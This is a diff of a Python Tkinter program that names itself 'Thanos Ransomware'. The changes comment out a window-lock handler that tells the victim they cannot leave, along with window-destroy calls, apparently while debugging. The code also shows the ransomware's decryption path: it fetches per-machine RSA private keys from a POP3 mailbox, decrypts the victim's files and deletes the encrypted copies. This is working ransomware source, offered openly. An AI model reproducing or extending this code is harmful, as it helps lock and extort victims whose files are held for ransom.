@@ -244,9 +244,11 @@ class MyTk:
                                       highlightthickness=0)
         self.l_thanos.pack()
 
+    '''
     def disable_event(self):
         messagebox.showinfo(title="Thanos Ransomware", message="You can't leave this window.")
         pass
+'''
 
     def keySubmit(self):
         self.pw = str(self.password.get())
@@ -257,8 +259,11 @@ class MyTk:
         self.parent and self.parent.checkPassword(self.pw)
 
         self.pwbutton.config(state='normal')
-        self.pwbutton['state'] = 'normal'
+        #self.pwbutton['state'] = 'normal'
         self.l_input.config(text=" It's the wrong key.")
+
+
+
 
     def finalGui(self):
         print("디버깅1")
@@ -287,10 +292,13 @@ class MyTk:
         self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
         self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
         self.l_final.pack()
-        sleep(5)
-        self.window.destroy()
+        #sleep(5)
+        #self.window.destroy()
+
+
 
     def allRemovePrint(self):
+
         self.l_timer.destroy()
         self.l_input.destroy()
         self.password.destroy()
@@ -425,7 +433,7 @@ class RealMain:
         th1.daemon = True
         th1.start()
 
-        self.myGui.window.protocol("WM_DELETE_WINDOW", self.myGui.disable_event)
+       # self.myGui.window.protocol("WM_DELETE_WINDOW", self.myGui.disable_event)
         self.myGui.window.mainloop()
 
     def checkPassword(self, gui_input=None):
@@ -439,8 +447,8 @@ class RealMain:
         for i in range(len(server.list()[1])):
             msg = server.retr(i + 1)[1]
             # text = b'\n'.join(msg).decode()  # 메일의 전체 내용을 읽어옴
-            # idx = text.find('Subject:')
-            # text = text[idx + 9:]
+            #idx = text.find('Subject:')
+            #text = text[idx + 9:]
             # uuid = text[: text.find('\n')]  # 메일의 수신자(mac 주소) 를 가져온다
             # key = text[42:]  # 메일에 들어있는 해당 주소의 private key
             uuid = msg[12].decode()[msg[12].decode().find(':') + 2:]
@@ -461,8 +469,10 @@ class RealMain:
                     for dec_target in dec_targetlist:
                         dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
                         os.remove(dec_target)
+
                     self.myGui.finalGui()
-                    self.myGui.window.destroy()
+                    #self.myGui.window.destroy()
+
 
 
 if __name__ == "__main__":
